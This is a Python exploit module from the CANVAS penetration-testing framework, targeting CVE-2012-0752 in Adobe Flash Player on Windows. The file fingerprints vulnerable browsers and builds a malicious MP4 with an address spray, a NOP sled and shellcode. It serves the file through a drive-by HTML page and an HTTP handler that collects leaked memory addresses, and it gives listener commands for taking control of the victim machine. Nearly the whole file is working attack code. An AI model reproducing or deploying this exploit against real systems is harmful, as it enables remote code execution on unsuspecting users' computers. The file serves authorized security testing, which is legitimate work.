#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
if "." not in sys.path: sys.path.append(".")

import hashlib
import random

from exploitutils import *
from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside

from libs.ua_parser import user_agent_parser

NAME                              = 'adobe_flash_mp4_cprt'
DESCRIPTION                       = 'Adobe Flash Player MP4 cprt'

DOCUMENTATION                     = {}
DOCUMENTATION['Vendor']           = 'Adobe'
DOCUMENTATION['Date public']      = '02/15/2012'
DOCUMENTATION['References']       = ['http://www.adobe.com/support/security/bulletins/apsb12-03.html', 
                                     'https://www.adobe.com/support/security/bulletins/apsb12-05.html',
                                     'http://zhodiac.hispahack.com/my-stuff/security/Flash_ASLR_bypass.pdf']

DOCUMENTATION['Repeatability']    = 'Infinite'
DOCUMENTATION['VersionsAffected'] = ('Adobe Flash Player 11.1.102.55 and earlier versions')
DOCUMENTATION['CVE Name']         = 'CVE-2012-0752'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0752'
DOCUMENTATION['CVSS']             = 10.0
DOCUMENTATION["Notes"]            = """
Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.109 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_mp4_cprt -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p 5555
"""

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ["2000", "XP", "Vista", "7"]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""

targets = {
    0: ['Autodetect (N/A)','0,0,0,0'],
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME 
        self.index           = "index.html"
        self.flash_name      = "Mp4Cprt.swf"
        self.mp4_name        = "movie.mp4"
        self.trigger         = os.path.join(os.path.dirname(__file__), 'Resources', self.flash_name)
        self.payload_address = "\xff\xff\xff\xff"
  
    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if not 'Windows' in parsed['os']['family']:
            self.log('Not Windows, not vulnerable to this exploit.')
            return 0
        
        import re
        #11.1.102.62 and earlier
        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )

            # If there's no match it will throw an exception
            if match:
                flash_version  = match.group(0)
            else:
                return 0

            version_list = flash_version.split(".")
            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            patch = int(version_list[3])

            if major == 10:
                if minor == 3:
                    if build < 183:
                        return 100
                    elif build == 183 and patch < 15:
                        return 100
                elif minor < 3:
                    return 100

            if major == 11:
                if minor == 1:
                    if build == 102 and patch < 62:
                        return 100
                    elif build < 102:
                        return 100
                elif minor < 1:
                    return 100
        return 0

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def makeHTML(self):
        filedata="""
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>Blank Page</title>
    </head>
    <body>
        <object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" width=600 height=430 VIEWASTEXT>
        <param name="allowScriptAccess" value="sameDomain" />
        <param name="allowFullScreen" value="false" />
        <param name="movie" value="Mp4Cprt.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />
        <embed src="Mp4Cprt.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="Mp4Cprt"
        align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash"
        pluginspage="http://www.macromedia.com/go/getflashplayer" />
        </object>
    </body>
</html>
        """
        return filedata

    def makeSWF(self):
        return open(self.trigger,"rb").read()

    def hexatostr(self,address):
        address_string = "%X" % address
        if len(address_string) % 2:
            address_string = "0" + address_string
        hexas = [int(address_string[i:i+2],16) for i in xrange(0,len(address_string),2)]
        hexas.reverse()
        hexa_string = ""
        for hexa in hexas:
            hexa_string += chr(hexa)
        return hexa_string

    def makeMP4(self):
        self.shellcode = mosdef.assemble("movl %esp, %ebp\naddl $0x200, %ebp", "X86")  + self.shellcode
        mp4 = ""
        mp4 += "\x00\x00\x00\x18"
        mp4 += "ftypmp42"
        mp4 += "\x00\x00\x00\x00"
        mp4 += "mp42isom"
        mp4 += "\x00\x00\x00\x0D"
        mp4 += "cprt"
        mp4 += "\x00\xFF\xFF\xFF"
        mp4 += "\x00\x00\x00\x00"
        mp4 += "\x00\x00"
        mp4 += self.payload_address * (2500-368)
        mp4 += "\x90\x90\x90\x90" * (100 + 368)
        mp4 += self.shellcode
        return mp4

    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        self.log("Request: "+clientheader.URL)
        if clientheader.URL.endswith("-generate.html"):
            payload_address, ntdll_address, discard = clientheader.URL.split('/')[-1].split('-')
            self.log('Payload address Received: %s' % payload_address)
            self.log('Ntdll address Received: %s' % ntdll_address)
            self.payload_address = self.hexatostr(int(payload_address,16))
            b.setBody("<html><body>OK</body></html>")
            h.addHeader("Content-Type","text/html")
        elif clientheader.URL.count(self.index):
            self.log('Serving HTML')
            b.setBody(self.makeHTML())
            h.addHeader("Content-Type","text/html")
        elif clientheader.URL.count(self.flash_name):
            self.log('Serving SWF')
            self.createShellcode()
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        elif clientheader.URL.count(self.mp4_name):
            self.log('Serving MP4')
            b.setBody(self.makeMP4())
            h.addHeader('Content-Type','video/mp4')
        else:
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.index)
            h.addHeader("Content-Type","text/html")
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
